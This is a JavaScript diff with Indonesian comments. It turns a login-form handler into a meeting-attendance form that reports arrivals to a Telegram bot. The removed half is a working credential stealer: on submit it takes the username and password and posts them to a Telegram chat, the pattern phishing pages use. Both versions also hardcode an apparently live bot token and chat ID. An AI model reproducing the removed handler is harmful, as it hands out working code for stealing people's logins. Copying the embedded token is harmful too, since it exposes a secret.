@@ -1,40 +1,28 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
+document.getElementById('absenForm').addEventListener('submit', function(event) {
     event.preventDefault();
-
-    const username = document.getElementById('username').value;
+    const nama = document.getElementById('nama').value;
     const password = document.getElementById('password').value;
-
-    // Kirim data login ke bot Telegram
-    sendDataToTelegram(`info login username:${username} password:${password}.`);
-});
-
-function sendDataToTelegram(data) {
-    const telegramBotToken = '6784104621:AAEVRyReTRmVtL_eGnFIZLbYm3FGkI0zF9M';
+    
+    // Token Bot Telegram dan ID Chat
+    const token = '6784104621:AAEVRyReTRmVtL_eGnFIZLbYm3FGkI0zF9M';
     const chatId = '7120969628';
-
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-    const params = {
-        chat_id: chatId,
-        text: data
-    };
-
-    fetch(url, {
-        method: 'POST',
-        mode: 'cors',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            alert('Login data sent to Telegram successfully!');
-        } else {
-            alert('Failed to send login data to Telegram.');
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
-}
+    
+    // Kirim data ke bot Telegram
+    const message = `username=${nama} telah datang rapat jam ${new Date().toLocaleTimeString()}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+    
+    // Kirim pesan ke bot Telegram
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                // Redirect ke halaman terima kasih jika pesan terkirim
+                window.location.href = 'terimakasih.html';
+            } else {
+                alert('Gagal mengirim pesan hadir. Silakan coba lagi.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Terjadi kesalahan. Silakan coba lagi.');
+        });
+});
